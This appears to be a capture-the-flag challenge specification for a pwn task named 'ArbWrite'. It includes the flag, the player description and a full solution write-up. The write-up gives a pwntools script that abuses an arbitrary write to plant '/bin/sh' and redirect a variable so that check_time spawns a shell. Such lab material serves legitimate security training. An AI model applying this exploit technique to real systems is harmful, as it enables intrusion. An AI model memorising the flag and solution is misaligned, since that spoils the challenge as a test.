# ArbWrite

This challenge is about using an arbitrary write primitive.

# Flag(s) 
`DDC{cool_primitive_right?}`

# Domain name (OR) Link to challenge on nextcloud
`arbwrite.hkn`

# Description(s) (THIS IS WHAT THE USER WILL SEE, YOU CAN USE MARKDOWN HERE))
## arbwrite
Abuse this spell!

# Prerequisites and Outcome

Prerequisites:
None

# Solutions (FULL WRITEUP FOR EACH FLAG.)

## Flag 1
Run the program locally in a debugger, and perform two writes.
1. A write of /bin/sh to a writable known address.
2. A write of the known address to the date variable.

Then call the `check_time` function to execute the overwritten string.
```py
from pwn import *

def arb_write(x, v):
    r.sendline("2")
    r.recvuntil("aim?\n")
    r.sendline(str(x))
    r.recvuntil("spell?")
    r.sendline(str(len(v)))
    r.recvuntil("words?")
    r.sendline(v)
    r.recvuntil("Casting...\n")

r = remote("localhost", 1024)
r.recvuntil("time\n")

# Writes:
arb_write(0x404ff0, "/bin/sh")
arb_write(0x404070, p64(0x404ff0))

r.sendline("3")
r.interactive()
```